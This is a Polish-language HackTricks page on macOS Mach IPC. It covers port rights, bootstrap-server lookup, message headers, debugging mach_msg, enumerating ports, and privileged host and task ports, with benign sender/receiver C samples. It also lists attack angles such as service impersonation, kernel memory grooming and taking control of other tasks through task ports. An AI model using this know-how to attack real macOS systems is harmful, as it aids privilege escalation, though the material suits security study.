# macOS IPC - Komunikacja między procesami

{{#include ../../../../banners/hacktricks-training.md}}

## Komunikacja Mach za pośrednictwem portów

### Podstawowe informacje

Mach używa **zadań** jako **najmniejszej jednostki** współdzielenia zasobów, a każde zadanie może zawierać **wiele wątków**. Te **zadania i wątki są mapowane w stosunku 1:1 na procesy i wątki POSIX**.

Komunikacja między zadaniami odbywa się za pośrednictwem Mach Inter-Process Communication (IPC), z wykorzystaniem jednokierunkowych kanałów komunikacji. **Wiadomości są przesyłane między portami**, które działają podobnie jak **kolejki wiadomości** zarządzane przez kernel.

**Port** jest **podstawowym** elementem Mach IPC. Może służyć do **wysyłania i odbierania** wiadomości.

Każdy proces ma **tabelę IPC**, w której można znaleźć **porty Mach procesu**. Nazwa portu Mach jest w rzeczywistości liczbą (wskaźnikiem do obiektu kernela).

Proces może również wysłać nazwę portu wraz z określonymi uprawnieniami **do innego zadania**, a kernel sprawi, że wpis ten pojawi się w **tabeli IPC drugiego zadania**.

### Uprawnienia portów

Uprawnienia portów, które definiują operacje, jakie zadanie może wykonywać, mają kluczowe znaczenie dla tej komunikacji. Możliwe **uprawnienia portów** to ([definicje pochodzą stąd](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Receive right**, które umożliwia odbieranie wiadomości wysyłanych do portu. Porty Mach to kolejki MPSC (multiple-producer, single-consumer), co oznacza, że w całym systemie może istnieć tylko **jedno uprawnienie RECEIVE dla każdego portu** (w przeciwieństwie do pipes, gdzie wiele procesów może posiadać deskryptory plików wskazujące na koniec odczytu jednego pipe).
- **Zadanie posiadające uprawnienie Receive** może odbierać wiadomości i **tworzyć uprawnienia Send**, umożliwiając sobie wysyłanie wiadomości. Początkowo tylko **własne zadanie posiada uprawnienie Receive do swojego portu**.
- Jeśli właściciel uprawnienia Receive **umrze** lub zostanie zabity, **uprawnienie Send staje się bezużyteczne (dead name).**
- **Send right**, które umożliwia wysyłanie wiadomości do portu.
- Uprawnienie Send może być **klonowane**, dzięki czemu zadanie posiadające uprawnienie Send może je sklonować i **przekazać trzeciemu zadaniu**.
- Należy pamiętać, że **uprawnienia portów** mogą być również **przekazywane** za pośrednictwem komunikatów Mach.
- **Send-once right**, które umożliwia wysłanie jednej wiadomości do portu, a następnie znika.
- Tego uprawnienia **nie można** **klonować**, ale można je **przenosić**.
- **Port set right**, które oznacza _zestaw portów_, a nie pojedynczy port. Usunięcie wiadomości z zestawu portów usuwa wiadomość z jednego z zawartych w nim portów. Zestawy portów mogą służyć do nasłuchiwania na wielu portach jednocześnie, podobnie jak `select`/`poll`/`epoll`/`kqueue` w Unixie.
- **Dead name**, które nie jest rzeczywistym uprawnieniem portu, lecz jedynie symbolem zastępczym. Gdy port zostanie zniszczony, wszystkie istniejące uprawnienia do tego portu zmieniają się w dead names.

**Zadania mogą przekazywać innym uprawnienia SEND**, umożliwiając im odsyłanie wiadomości. **Uprawnienia SEND można również klonować, dzięki czemu zadanie może je zduplikować i przekazać trzeciemu zadaniu**. W połączeniu z procesem pośredniczącym znanym jako **bootstrap server** umożliwia to skuteczną komunikację między zadaniami.

### File Ports

File ports umożliwiają enkapsulację deskryptorów plików w portach Mac (z użyciem uprawnień portów Mach). Możliwe jest utworzenie `fileport` z danego FD za pomocą `fileport_makeport` oraz utworzenie FD z fileport za pomocą `fileport_makefd`.

### Nawiązywanie komunikacji

Jak wspomniano wcześniej, możliwe jest wysyłanie uprawnień za pomocą komunikatów Mach, jednak **nie można wysłać uprawnienia bez wcześniejszego posiadania uprawnienia** do wysłania komunikatu Mach. Jak zatem nawiązywana jest pierwsza komunikacja?

W tym celu zaangażowany jest **bootstrap server** (**launchd** w macOS). Ponieważ **każdy może uzyskać uprawnienie SEND do bootstrap servera**, można poprosić go o uprawnienie do wysyłania wiadomości do innego procesu:

1. Zadanie **A** tworzy **nowy port**, uzyskując do niego **uprawnienie RECEIVE**.
2. Zadanie **A**, jako posiadacz uprawnienia RECEIVE, **tworzy uprawnienie SEND dla portu**.
3. Zadanie **A** nawiązuje **połączenie** z **bootstrap serverem** i **wysyła mu uprawnienie SEND** do portu utworzonego na początku.
- Pamiętaj, że każdy może uzyskać uprawnienie SEND do bootstrap servera.
4. Zadanie A wysyła do bootstrap servera komunikat `bootstrap_register`, aby **powiązać dany port z nazwą**, taką jak `com.apple.taska`
5. Zadanie **B** komunikuje się z **bootstrap serverem**, aby wykonać bootstrap **lookup** nazwy usługi (`bootstrap_lookup`). Aby bootstrap server mógł odpowiedzieć, zadanie B wyśle mu **uprawnienie SEND do portu utworzonego wcześniej** w komunikacie lookup. Jeśli lookup zakończy się powodzeniem, **server duplikuje uprawnienie SEND** otrzymane od zadania A i **przekazuje je zadaniu B**.
- Pamiętaj, że każdy może uzyskać uprawnienie SEND do bootstrap servera.
6. Dzięki temu uprawnieniu SEND **zadanie B** może **wysłać** **wiadomość** **do zadania A**.
7. W celu uzyskania komunikacji dwukierunkowej zadanie **B** zwykle tworzy nowy port z uprawnieniem **RECEIVE** i uprawnieniem **SEND**, a następnie przekazuje **uprawnienie SEND zadaniu A**, aby mogło ono wysyłać wiadomości do ZADANIA B (komunikacja dwukierunkowa).

Bootstrap server **nie może uwierzytelnić** nazwy usługi zadeklarowanej przez zadanie. Oznacza to, że **zadanie** może potencjalnie **podszyć się pod dowolne zadanie systemowe**, na przykład fałszywie **zadeklarować nazwę usługi autoryzacyjnej**, a następnie zatwierdzać każde żądanie.

Apple przechowuje następnie **nazwy usług dostarczanych przez system** w bezpiecznych plikach konfiguracyjnych znajdujących się w katalogach chronionych przez **SIP**: `/System/Library/LaunchDaemons` oraz `/System/Library/LaunchAgents`. Wraz z każdą nazwą usługi przechowywany jest również **powiązany plik binarny**. Bootstrap server tworzy i przechowuje **uprawnienie RECEIVE dla każdej z tych nazw usług**.

W przypadku tych predefiniowanych usług proces **lookup** przebiega nieco inaczej. Gdy wyszukiwana jest nazwa usługi, launchd uruchamia usługę dynamicznie. Nowy przebieg wygląda następująco:

- Zadanie **B** inicjuje bootstrap **lookup** nazwy usługi.
- **launchd** sprawdza, czy zadanie jest uruchomione, a jeśli nie, **uruchamia** je.
- Zadanie **A** (usługa) wykonuje **bootstrap check-in** (`bootstrap_check_in()`). W tym momencie **bootstrap** server tworzy uprawnienie SEND, zachowuje je i **przekazuje uprawnienie RECEIVE zadaniu A**.
- launchd duplikuje **uprawnienie SEND i wysyła je zadaniu B**.
- Zadanie **B** tworzy nowy port z uprawnieniem **RECEIVE** i uprawnieniem **SEND**, a następnie przekazuje **uprawnienie SEND zadaniu A** (usłudze), aby mogło ono wysyłać wiadomości do ZADANIA B (komunikacja dwukierunkowa).

Ten proces dotyczy jednak wyłącznie predefiniowanych zadań systemowych. Zadania inne niż systemowe nadal działają zgodnie z pierwotnym opisem, co potencjalnie może umożliwiać podszywanie się.

> [!CAUTION]
> Dlatego launchd nigdy nie powinien ulec awarii, ponieważ spowoduje to awarię całego systemu.

### Komunikat Mach

[Więcej informacji tutaj](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

Funkcja `mach_msg`, będąca zasadniczo wywołaniem systemowym, służy do wysyłania i odbierania komunikatów Mach. Funkcja wymaga, aby komunikat przeznaczony do wysłania był jej pierwszym argumentem. Komunikat ten musi zaczynać się od struktury `mach_msg_header_t`, po której następuje właściwa treść komunikatu. Struktura jest zdefiniowana następująco:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Procesy posiadające _**receive right**_ mogą odbierać wiadomości na porcie Mach. Z kolei **senders** otrzymują _**send**_ lub _**send-once right**_. **send-once right** służy wyłącznie do wysłania jednej wiadomości, po czym staje się nieważne.

Początkowe pole **`msgh_bits`** jest bitmapą:

- Pierwszy bit (najbardziej znaczący) służy do wskazania, że wiadomość jest złożona (więcej informacji poniżej)
- 3. i 4. bit są używane przez kernel
- **5 najmniej znaczących bitów 2. bajtu** może być używanych dla **voucher**: innego typu portu służącego do wysyłania kombinacji klucz/wartość.
- **5 najmniej znaczących bitów 3. bajtu** może być używanych dla **local port**
- **5 najmniej znaczących bitów 4. bajtu** może być używanych dla **remote port**

Typy, które można określić w portach voucher, local i remote, to (z [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Na przykład `MACH_MSG_TYPE_MAKE_SEND_ONCE` może służyć do **wskazania**, że dla tego portu należy wyprowadzić i przekazać **uprawnienie** typu **send-once**. Można również określić `MACH_PORT_NULL`, aby uniemożliwić odbiorcy wysłanie odpowiedzi.

Aby uzyskać łatwą **dwukierunkową komunikację**, proces może określić **mach port** w **nagłówku** mach **wiadomości**, nazywanym _portem odpowiedzi_ (**`msgh_local_port`**), za pomocą którego **odbiorca** wiadomości może **wysłać odpowiedź** na tę wiadomość.

> [!TIP]
> Należy zauważyć, że ten rodzaj dwukierunkowej komunikacji jest używany w wiadomościach XPC, które oczekują odpowiedzi (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Jednak **zwykle tworzone są różne porty**, jak wyjaśniono wcześniej, aby utworzyć dwukierunkową komunikację.

Pozostałe pola nagłówka wiadomości to:

- `msgh_size`: rozmiar całego pakietu.
- `msgh_remote_port`: port, do którego wysyłana jest ta wiadomość.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: ID tej wiadomości, interpretowane przez odbiorcę.

> [!CAUTION]
> Należy zauważyć, że **wiadomości mach są wysyłane przez `mach port`**, który jest wbudowanym w kernel mach kanałem komunikacyjnym z **pojedynczym odbiorcą** i **wieloma nadawcami**. **Wiele procesów** może **wysyłać wiadomości** do portu mach, ale w dowolnym momencie tylko **pojedynczy proces może** je z niego **odczytywać**.

Wiadomości są następnie tworzone z nagłówka **`mach_msg_header_t`**, po którym następują **ciało** i **trailer** (jeśli istnieje); mogą one przyznawać uprawnienie do udzielenia odpowiedzi. W takich przypadkach kernel musi jedynie przekazać wiadomość z jednego taska do drugiego.

**Trailer** to **informacje dodawane do wiadomości przez kernel** (nie mogą być ustawiane przez użytkownika), których można zażądać podczas odbierania wiadomości za pomocą flag `MACH_RCV_TRAILER_<trailer_opt>` (można zażądać różnych informacji).

#### Złożone wiadomości

Istnieją jednak również inne, bardziej **złożone** wiadomości, na przykład te przekazujące dodatkowe uprawnienia do portów lub współdzielące pamięć, w przypadku których kernel musi także wysłać te obiekty do odbiorcy. W takich przypadkach ustawiany jest najbardziej znaczący bit nagłówka `msgh_bits`.

Możliwe deskryptory do przekazania są zdefiniowane w [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
W 32 bitach wszystkie deskryptory mają 12 B, a typ deskryptora znajduje się w 11. W 64 bitach rozmiary są różne.

> [!CAUTION]
> Kernel skopiuje deskryptory z jednego taska do drugiego, ale najpierw **tworzy kopię w pamięci kernela**. Ta technika, znana jako "Feng Shui", była wykorzystywana w kilku exploitach, aby zmusić **kernel do kopiowania danych do swojej pamięci** poprzez wysłanie przez proces deskryptorów do samego siebie. Następnie proces może odebrać wiadomości (kernel je zwolni).
>
> Możliwe jest również **wysłanie praw portów do podatnego procesu** — prawa portów po prostu pojawią się w procesie (nawet jeśli ich nie obsługuje).

### Mac Ports APIs

Należy pamiętać, że porty są powiązane z przestrzenią nazw taska, więc podczas tworzenia lub wyszukiwania portu odpytywana jest również przestrzeń nazw taska (więcej informacji w `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Tworzenie** portu.
- `mach_port_allocate` może również utworzyć **port set**: prawo odbioru dla grupy portów. Za każdym razem, gdy odbierana jest wiadomość, wskazywany jest port, z którego pochodzi.
- `mach_port_allocate_name`: Zmiana nazwy portu (domyślnie 32-bitowa liczba całkowita)
- `mach_port_names`: Pobieranie nazw portów z celu
- `mach_port_type`: Pobieranie praw taska względem nazwy
- `mach_port_rename`: Zmiana nazwy portu (podobnie jak dup2 dla FD)
- `mach_port_allocate`: Przydzielenie nowego RECEIVE, PORT_SET lub DEAD_NAME
- `mach_port_insert_right`: Utworzenie nowego prawa w porcie, dla którego posiadasz RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funkcje używane do **wysyłania i odbierania wiadomości mach**. Wersja overwrite umożliwia określenie innego bufora do odbierania wiadomości (druga wersja po prostu użyje go ponownie).

### Debugowanie mach_msg

Ponieważ funkcje **`mach_msg`** i **`mach_msg_overwrite`** służą do wysyłania i odbierania wiadomości, ustawienie na nich breakpointu umożliwi przeanalizowanie wysłanych i odebranych wiadomości.

Na przykład rozpocznij debugowanie dowolnej aplikacji, którą możesz debugować, ponieważ załaduje ona **`libSystem.B`, która użyje tej funkcji**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Aby uzyskać argumenty **`mach_msg`**, sprawdź rejestry. Są to argumenty (z [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Pobierz wartości z rejestrów:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Przeanalizuj nagłówek komunikatu, sprawdzając pierwszy argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Ten typ `mach_msg_bits_t` jest bardzo często używany, aby umożliwić odpowiedź.

### Enumerowanie portów
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**name** to domyślna nazwa nadana portowi (sprawdź, jak **zwiększa się** w pierwszych 3 bajtach). **`ipc-object`** to **zaciemniony** unikalny **identyfikator** portu.\
Zwróć również uwagę, że porty mające wyłącznie uprawnienie **`send`** **identyfikują właściciela** (nazwa portu + pid).\
Zwróć także uwagę na użycie **`+`** do oznaczenia **innych zadań połączonych z tym samym portem**.

Możliwe jest również użycie [**procesxp**](https://www.newosxbook.com/tools/procexp.html) do wyświetlenia także **zarejestrowanych nazw usług** (przy wyłączonym SIP ze względu na konieczność użycia `com.apple.system-task-port`):
```
procesp 1 ports
```
Możesz zainstalować to narzędzie w systemie iOS, pobierając je z [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Przykład kodu

Zwróć uwagę, jak **nadawca** **przydziela** port, tworzy **prawo do wysyłania** dla nazwy `org.darlinghq.example` i wysyła je do **serwera bootstrap**, podczas gdy nadawca żąda **prawa do wysyłania** tej nazwy i używa go do **wysłania wiadomości**.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Porty uprzywilejowane

Istnieją specjalne porty, które pozwalają **wykonywać określone wrażliwe działania lub uzyskiwać dostęp do określonych wrażliwych danych**, jeśli zadanie ma względem nich uprawnienia **SEND**. Sprawia to, że porty te są bardzo interesujące z perspektywy atakujących — nie tylko ze względu na ich możliwości, ale również dlatego, że możliwe jest **udostępnianie uprawnień SEND między zadaniami**.

### Specjalne porty hosta

Porty te są reprezentowane przez liczby.

Uprawnienia **SEND** można uzyskać, wywołując **`host_get_special_port`**, a uprawnienia **RECEIVE** — wywołując **`host_set_special_port`**. Jednak oba wywołania wymagają portu **`host_priv`**, do którego dostęp ma wyłącznie root. Ponadto w przeszłości root mógł wywołać **`host_set_special_port`** i przejąć dowolny port, co pozwalało na przykład ominąć sygnatury kodu poprzez przejęcie `HOST_KEXTD_PORT` (obecnie SIP temu zapobiega).

Są one podzielone na 2 grupy: **pierwsze 7 portów jest własnością kernela** — 1 to `HOST_PORT`, 2 to `HOST_PRIV_PORT`, 3 to `HOST_IO_MASTER_PORT`, a 7 to `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Porty zaczynające się **od** numeru **8** są **własnością daemonów systemowych** i można je znaleźć w deklaracji [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Port hosta**: Jeśli proces ma uprawnienia **SEND** względem tego portu, może uzyskać **informacje** o **systemie**, wywołując jego funkcje, takie jak:
- `host_processor_info`: Pobiera informacje o procesorze
- `host_info`: Pobiera informacje o hoście
- `host_virtual_physical_table_info`: Tabela stron wirtualnych/fizycznych (wymaga MACH_VMDEBUG)
- `host_statistics`: Pobiera statystyki hosta
- `mach_memory_info`: Pobiera układ pamięci kernela
- **Port Host Priv**: Proces posiadający uprawnienia **SEND** względem tego portu może wykonywać **uprzywilejowane działania**, takie jak wyświetlanie danych rozruchowych lub próba załadowania rozszerzenia kernela. **Proces musi działać jako root**, aby uzyskać to uprawnienie.
- Ponadto, aby wywołać API **`kext_request`**, wymagane są dodatkowe entitlements **`com.apple.private.kext*`**, które są nadawane wyłącznie binariom Apple.
- Inne możliwe do wywołania funkcje to:
- `host_get_boot_info`: Pobiera `machine_boot_info()`
- `host_priv_statistics`: Pobiera uprzywilejowane statystyki
- `vm_allocate_cpm`: Przydziela ciągłą pamięć fizyczną
- `host_processors`: Uprawnienia SEND do procesorów hosta
- `mach_vm_wire`: Zapewnia rezydencję pamięci
- Ponieważ root może uzyskać dostęp do tego uprawnienia, może wywołać `host_set_[special/exception]_port[s]`, aby **przejąć specjalne lub wyjątkowe porty hosta**.

Możliwe jest **wyświetlenie wszystkich specjalnych portów hosta** za pomocą:
```bash
procexp all ports | grep "HSP"
```
### Specjalne porty zadań

Są to porty zarezerwowane dla dobrze znanych usług. Można je pobierać/ustawiać, wywołując `task_[get/set]_special_port`. Można je znaleźć w pliku `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Z [tego miejsca](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[9]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: Port używany do kontrolowania tego zadania. Służy do wysyłania komunikatów wpływających na zadanie. Jest to port zwracany przez **mach_task_self (see Task Ports below)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Port bootstrap zadania. Służy do wysyłania komunikatów z żądaniem zwrócenia portów innych usług systemowych.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Port używany do żądania informacji o hoście zawierającym zadanie. Jest to port zwracany przez **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Port wskazujący źródło, z którego to zadanie pobiera przewodową pamięć jądra.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Port wskazujący źródło, z którego to zadanie pobiera domyślnie zarządzaną pamięć.

### Task Ports

Pierwotnie Mach nie miał „procesów”, lecz „tasks”, które były traktowane bardziej jak kontenery wątków. Gdy Mach został połączony z BSD, **każde task zostało powiązane z procesem BSD**. Dlatego każdy proces BSD ma szczegóły potrzebne do bycia procesem, a każde Mach task ma również swoje wewnętrzne mechanizmy (z wyjątkiem nieistniejącego pid 0, którym jest `kernel_task`).

Istnieją dwie bardzo interesujące funkcje związane z tym zagadnieniem:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Pobiera prawo SEND dla task port zadania powiązanego z `pid` i przekazuje je do wskazanego `target_task_port` (zwykle jest to task wywołującego, który użył `mach_task_self()`, ale może to być port SEND dla innego task).
- `pid_for_task(task, &pid)`: Mając prawo SEND do task, ustala, z którym PID ten task jest powiązany.

Aby wykonywać działania wewnątrz task, task potrzebuje prawa `SEND` do samego siebie, uzyskanego przez wywołanie `mach_task_self()` (które używa `task_self_trap` (28)). Dzięki temu uprawnieniu task może wykonywać różne działania, takie jak:

- `task_threads`: Pobranie prawa SEND do wszystkich task ports wątków danego task
- `task_info`: Pobranie informacji o task
- `task_suspend/resume`: Wstrzymanie lub wznowienie task
- `task_[get/set]_special_port`
- `thread_create`: Utworzenie wątku
- `task_[get/set]_state`: Kontrolowanie stanu task
- i wiele innych, które można znaleźć w [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Zauważ, że posiadając prawo SEND do task port innego **task**, można wykonywać takie działania na tym innym task.

